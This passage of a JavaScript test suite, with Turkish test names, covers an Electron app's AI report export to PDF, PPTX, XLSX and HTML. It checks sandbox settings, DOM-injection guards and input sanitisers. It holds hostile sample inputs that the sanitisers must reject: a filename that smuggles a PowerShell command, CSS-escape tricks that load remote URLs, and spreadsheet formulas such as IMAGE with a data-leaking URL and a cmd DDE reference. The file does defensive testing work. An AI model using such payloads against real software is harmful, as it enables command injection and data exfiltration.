  const render = main.slice(main.indexOf('const AI_PDF_PARTITION'), main.indexOf('function trustedBuyerLogIpcSender'));
  assert.match(render, /const AI_PDF_PARTITION = 'buyerlog-ai-pdf';/, 'tek bellek içi oturum (sızıntı yok)');
  assert.match(render, /aiPdfQueue/, 'basımlar sıralı');
  assert.match(render, /javascript: false/);
  assert.match(render, /sandbox: true/);
  assert.match(render, /nodeIntegration: false/);
  assert.match(render, /cancel: !\/\^\(data\|about\):\/i\.test/);
  assert.match(render, /setPermissionRequestHandler\(\(_contents, _permission, callback\) => callback\(false\)\)/);
  assert.match(render, /setWindowOpenHandler\(\(\) => \(\{ action: 'deny' \}\)\)/);
  assert.doesNotMatch(render, /preload|persist:|writeFile/);
  assert.match(render, /printToPDF\(/);
  const preload = fs.readFileSync(path.join(ROOT, 'electron', 'preload.js'), 'utf8');
  assert.match(preload, /renderPdf: \(html, options\) => ipcRenderer\.invoke\('buyerlog:render-pdf', \{\s*html: String\(html \|\| ''\),\s*landscape: Boolean\(options && options\.landscape\),\s*\}\)/);
});

test('arayüz: yanıt biçimi seçici, dosya kartı (Aç/Klasörde Göster), ham HTML DOM’a girmez, TR/EN', () => {
  const chat = fs.readFileSync(path.join(ROOT, 'public', 'lcwai-chat.js'), 'utf8');
  for (const key of ["key: 'pdf'", "key: 'pptx'", "key: 'xlsx'", "key: 'html'"]) assert.ok(chat.includes(key), key);
  assert.match(chat, /data-output-orientation/);
  assert.match(chat, /data-output-detail/);
  assert.match(chat, /data-file-open=/);
  assert.match(chat, /data-file-reveal=/);
  assert.match(chat, /L\('Klasörde Göster', 'Show in folder'\)/);
  assert.match(chat, /window\.notifyFileReady\(/);
  assert.doesNotMatch(chat, /\.html\s*\)?\s*;?\s*$|innerHTML\s*=\s*[^;]*\.output\.html|output\.html/m, 'rapor HTML’i sohbet DOM’una yazılmaz');
  const assistant = fs.readFileSync(path.join(ROOT, 'public', 'lcwai-assistant.js'), 'utf8');
  const finalize = assistant.slice(assistant.indexOf('async function finalizePdf'), assistant.indexOf('const outputAction'));
  assert.match(finalize, /desktop\.renderPdf\(pending\.html/);
  assert.doesNotMatch(finalize, /innerHTML|srcdoc|document\.write|insertAdjacentHTML/);
  assert.match(finalize, /\/fallback`/);
  assert.match(assistant, /openOutput, revealOutput, listOutputs/);
  for (const code of ['LCWAI_OUTPUT_INVALID', 'LCWAI_OUTPUT_RENDER_FAILED', 'LCWAI_OUTPUT_NOT_FOUND']) {
    assert.ok(assistant.includes(`${code}: { tr:`), code);
    assert.ok(require('../server/lib/lcwai/lcwai-errors').CODES[code.replace('LCWAI_', '')], code);
  }
});

/* ---------------- İnceleme bulguları (regresyon) ---------------- */
test('güvenlik: AI başlığından gelen dosya adı kabuk/joker karakteri taşımaz; PowerShell tipografik tırnağı da kaçışlar', () => {
  assert.equal(safeFileBase("Rapor’; Start-Process calc; ’"), 'Rapor Start-Process calc');
  assert.equal(safeFileBase('LCW AI’ın Q3’s [a] $x `y` & %z%'), 'LCW AIın Q3s a x y z');
  const platform = require('../server/lib/platform');
  if (platform.IS_WINDOWS) {
    const plan = platform.externalOpenPlan("C:\\x\\a’b'c.pdf");
    assert.match(plan.args.at(-1), /a’’b''c\.pdf'$/);
  }
  const source = fs.readFileSync(path.join(ROOT, 'server', 'lib', 'platform.js'), 'utf8');
  assert.match(source, /replace\(\/\['\\u2018-\\u201B\]\/g, quote => quote \+ quote\)/);
});

test('güvenlik: CSS kaçışı ve image-set ile uzak kaynak sızmaz; tırnaksız öznitelikteki / atılır', () => {
  assert.equal(html.safeCss('background:\\75 rl(https://e/x)'), null);
  assert.equal(html.safeCss('background:image-set("https://e" 1x)'), null);
  assert.equal(html.safeCss('width:40%;color:#fff'), 'width:40%;color:#fff');
  const sheet = html.sanitizeStyleSheet('.a{color:red;background:\\75rl(https://e/x)} @\\69mport "https://e/c.css"; .b{background:-webkit-image-set("https://e" 1x)}');
  assert.doesNotMatch(sheet, /https?:|\\|import/);
  assert.match(sheet, /\.a\{color:red;/);
  assert.equal(html.sanitizeHtml('<svg><rect height=10/></svg>').body, '<svg><rect height="10"></rect></svg>');
});

test('XLSX formülleri izin listesiyle doğrulanır; ";" ayırıcı, uzak veri ve dış başvuru düşer; sayfa adı ≤ 31', () => {
  assert.equal(contracts.safeFormula('=SUM(B2:B10)'), 'SUM(B2:B10)');
  assert.equal(contracts.safeFormula('IF(A1>0,"a;b",0)'), 'IF(A1>0,"a;b",0)');
  for (const bad of ['SUM(B2;B10)', 'IMAGE("https://x/?d="&A2)', 'WEBSERVICE("x")', '[Book]S!A1', 'cmd|x!A1', 'SUM((1)', 'STOCKHISTORY("X")']) assert.equal(contracts.safeFormula(bad), null, bad);
  const long = 'Çok Uzun Bir Sayfa Adı Örneği 2026';
  const workbook = contracts.normalizeWorkbook({ title: 't', sheets: Array.from({ length: 10 }, () => ({ name: long, columns: ['a'], rows: [[1]] })).concat([{ name: 'History', columns: ['a'], rows: [[1]] }]) }).data;
  const names = XLSX.read(renderWorkbook(workbook), { type: 'buffer' }).SheetNames;
  assert.ok(names.every(name => name.length <= 31), names.join('|'));
  assert.equal(new Set(names.map(name => name.toLowerCase())).size, names.length);
  assert.ok(!names.includes('History'));
});

test('istem kırpılırken kullanıcı isteği korunur (kırpılan bağlamdır)', () => {
  const prompts = require('../server/lib/lcwai/lcwai-prompt');
  const huge = { label: 'CP', screen: 'cp', columns: ['A'], rows: Array.from({ length: 400 }, (_, i) => [`${'x'.repeat(180)}${i}`]), totalRows: 400 };
  const built = prompts.buildChatPrompt({ message: 'KULLANICI-ISTEGI sonuna kadar', contexts: [huge, huge, huge, huge], lang: 'tr' });
  assert.ok(built.prompt.endsWith('KULLANICI-ISTEGI sonuna kadar'));
  assert.ok(built.prompt.length <= require('../server/lib/lcwai/lcwai-config').LIMITS.maxPromptChars);
});

test('AI Outputs: bozuk metadata ezilmeden yedeklenir', () => {
  const dir = tempDir();
  const store = createOutputStore({ root: path.join(dir, 'ai-outputs') });
  fs.writeFileSync(store.indexFile(), '{bozuk');
  store.save('u1', { buffer: Buffer.from('a'), title: 'x', format: 'html' });
  assert.ok(fs.readdirSync(dir).some(name => name.startsWith('ai-outputs-index.json.corrupt-')));
  assert.equal(store.list('u1').length, 1);
});

test('dinamik tasarım: HTML’de yalnız-CSS animasyonlar (azaltılmış harekete ve baskıya saygılı), PPTX geçiş + renk geçişi, XLSX veri çubuğu', () => {
  const screen = theme.reportCss({ print: false });
  assert.match(screen, /@media screen and \(prefers-reduced-motion:no-preference\)\{/);
  for (const name of ['bl-rise', 'bl-pop', 'bl-grow', 'bl-ring', 'bl-shift']) assert.match(screen, new RegExp(`@keyframes ${name}\\{`));
  assert.match(screen, /@media print\{[^]*animation:none !important/);
  assert.doesNotMatch(theme.reportCss({ print: true }), /prefers-reduced-motion/, 'PDF’de animasyon yok');
  for (const cls of ['bl-ring', 'bl-timeline', 'bl-steps', 'bl-progress', 'bl-trend']) assert.match(screen, new RegExp(`\\.${cls}\\b`));
  assert.match(contracts.buildInstruction({ format: 'html', template: templates.TEMPLATES.general, lang: 'tr' }), /bl-rings[^]*JavaScript asla/);
  const deck = contracts.normalizePresentation({ title: 'T', slides: [{ layout: 'section', title: 'S' }, { layout: 'bullets', title: 'B', bullets: ['x'] }] }).data;
  const files = unzip(renderPresentation(deck));
  assert.match(files['ppt/slides/slide1.xml'], /<a:gradFill rotWithShape="1">/);
  assert.match(files['ppt/slides/slide2.xml'], /<p:transition spd="slow"><p:push dir="u"\/><\/p:transition><\/p:sld>$/);
  assert.match(files['ppt/slides/slide3.xml'], /<p:transition spd="med"><p:fade\/><\/p:transition><\/p:sld>$/);
  assert.match(files['ppt/slides/slide1.xml'], /<a:alpha val="9000"\/>/);
  const book = unzip(renderWorkbook(contracts.normalizeWorkbook({ title: 't', sheets: [{ name: 'S', columns: [{ header: 'A', type: 'text' }, { header: 'N', type: 'integer' }], rows: [['a', 1], ['b', 2]] }] }).data));
  assert.match(book['xl/worksheets/sheet1.xml'], /<cfRule type="dataBar" priority="2">/);
  assert.match(book['xl/worksheets/sheet1.xml'], /<conditionalFormatting sqref="B2:B3">/);
  assert.match(book['xl/styles.xml'], /<dxfs count="1">/);
});
